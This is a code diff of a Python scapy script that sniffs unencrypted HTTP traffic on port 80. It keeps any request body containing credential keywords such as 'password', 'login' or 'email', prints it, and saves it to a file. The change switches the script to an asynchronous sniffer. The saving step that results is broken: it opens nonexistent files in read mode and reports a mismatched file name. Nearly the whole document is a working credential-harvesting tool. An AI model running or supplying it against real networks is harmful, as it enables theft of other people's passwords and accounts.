@@ -1,41 +1,36 @@
 import scapy.all as scapy
 from scapy.layers import http
 
-def http():
-    def sniff(interface):
-        packets = []
-        scapy.sniff(iface=interface, store=False, prn=lambda pkt: packets.append(pkt), filter="port 80")
-        return packets
+def sniff_packets(interface):
+    packets = []
 
-    def process_sniffed_packet(packet):
+    def process_http_packet(packet):
         if packet.haslayer(http.HTTPRequest):
             if packet.haslayer(scapy.Raw):
                 load = packet[scapy.Raw].load.decode()  # Convert bytes to string using decode()
-                keywords = ["username", "user", "login", "password", "pass", "usr", "userID", "uname", "email",
-                            "userPassword", "pswd", "pwd"]
+                keywords = ["username", "user", "login", "password", "pass", "usr", "userID", "uname", "email", "userPassword", "pswd", "pwd"]
                 for keyword in keywords:
                     if keyword in load:
+                        packets.append(load)
                         print(load)
                         break
 
-    packets = sniff("eth0")
+    sniff_thread = scapy.AsyncSniffer(iface=interface, store=False, prn=process_http_packet, filter="port 80")
+    sniff_thread.start()
 
     while True:
-        user_input = input("[s] Stop sniffing \n[f] Save the result\n[c] Continue sniffing\n")
+        user_input = input("[+] S to stop sniffing [+]\n[+] F to save the results [+] \n")
         if user_input.lower() == 's':
+            sniff_thread.stop()
             break
         elif user_input.lower() == 'f':
             file_name = input("Enter a file name to save the output: ")
-            with open(file_name, 'w') as f:
-                for packet in packets:
-                    process_sniffed_packet(packet)
-                    f.write(str(packet))  # Save the packet details to the file
-                    f.write('\n')
-            print('Result saved to file:', file_name)
-            break
-        elif user_input.lower() == 'c':
-            continue
-        else:
-            print("Invalid input. Please try again.")
+            with open('sniff results'):
+                with open('http'):
+                    with open(file_name , 'w') as f:
+                        for packet in packets:
+                            f.write(packet + '\n')
+                print("Results saved to file:", file_name + "_http.txt")
+                break
 
-http()
+sniff_packets("eth0")
